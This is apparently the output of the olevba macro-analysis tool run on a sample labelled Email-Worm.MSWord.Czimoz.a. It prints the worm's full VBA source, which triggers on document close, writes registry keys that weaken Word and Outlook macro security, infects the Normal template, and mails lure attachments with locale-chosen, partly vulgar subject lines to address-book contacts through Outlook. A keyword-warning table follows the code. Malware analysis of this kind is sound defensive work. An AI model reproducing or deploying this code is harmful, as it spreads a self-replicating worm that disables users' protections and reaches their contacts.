olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Email-Worm.MSWord.Czimoz.a-f6ff08de971606d6dcc9e116a9d8b404a3caaf75
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Email-Worm.MSWord.Czimoz.a-f6ff08de971606d6dcc9e116a9d8b404a3caaf75 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub document_close()
Rem Word2007.zabijaka (c)by Necronomikon[DCA]
Dim s(3) As String, e, shell
Dim f(3) As String, lang
Set shell = CreateObject(("WScript" + ".Shell"))
RegPath = "HKCU\Software\Microsoft\Office\12.0\Word\Security\"
shell.RegWrite RegPath & "Level", 1, "REG_DWORD"
shell.RegWrite RegPath & "AccessVBOM", 1, "REG_DWORD"
RegPath1 = "HKCU\Software\Microsoft\Office\12.0\Outlook\Security\"
shell.RegWrite RegPath1 & "Level", 1, "REG_DWORD"
shell.RegWrite "HKCU\Software\Office\12.0\Word\Options\DefaultFormat", "Doc97"
M = CallByName(VBE.ActiveCodePane.codemodule, "Lines", VbGet, 1, 61)
If CallByName(Application, "MacroContainer", VbGet) = NormalTemplate Then
Set k = ActiveDocument.VBProject.vbcomponents(1).codemodule
Else
Set k = NormalTemplate.VBProject.vbcomponents(1).codemodule
End If
CallByName k, "Deletelines", VbMethod, 1, CallByName(k, "Countoflines", VbGet)
CallByName k, "Addfromstring", VbMethod, M
f(1) = "Readme.doc"
f(2) = "Password.doc"
f(3) = "Help.doc"
lang = shell.RegRead("HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Nls\Locale\")
If (lang = "00000407") Then
s(1) = "Mach deine Träume wahr!"
s(2) = "Willst du ficken?"
s(3) = "Könnten Sie mir helfen?"
ElseIf (lang = "00000415") Then
s(1) = "Spelnij swoje marzenia!"
s(2) = "Chce cie jebac?"
s(3) = "Czy moze mi pan pomóc?"
Else
s(1) = "Make your dreams come true!"
s(2) = "Wanna fuck?"
s(3) = "Can you help me?"
End If
Randomize
e = Int(Rnd * 3) + 1
RandomSubject = s(e)
q = Int(Rnd * 3) + 1
Randomfilez = f(q)
Set Ne_OApp = CreateObject(("Outlook." + "Application"))
Set Ne_Mapi = Ne_OApp.GetNameSpace(("MA" + "PI"))
For Each Ne_AddList In Ne_Mapi.AddressLists
Next
If Ne_AddList.AddressEntries.Count <> 0 Then
For Ne_AddListCount = 1 To Ne_AddList.AddressEntries.Count
Next
Set Ne_AddListEntry = Ne_AddList.AddressEntries(Ne_AddListCount)
Set Ne_msg = Ne_OApp.CreateItem(0)
Ne_msg.To = Ne_AddListEntry.Address
Ne_msg.Subject = RandomSubject
Ne_msg.Body = ""
Ne_msg.Attachments.Add Randomfilez
Ne_msg.Importance = 2
Ne_msg.DeleteAfterSubmit = True
End If
If Ne_msg.To <> "" Then
Ne_msg.Send
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_close      |Runs when the Word document is closed        |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|AccessVBOM          |May attempt to disable VBA macro security and|
|          |                    |Protected View                               |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
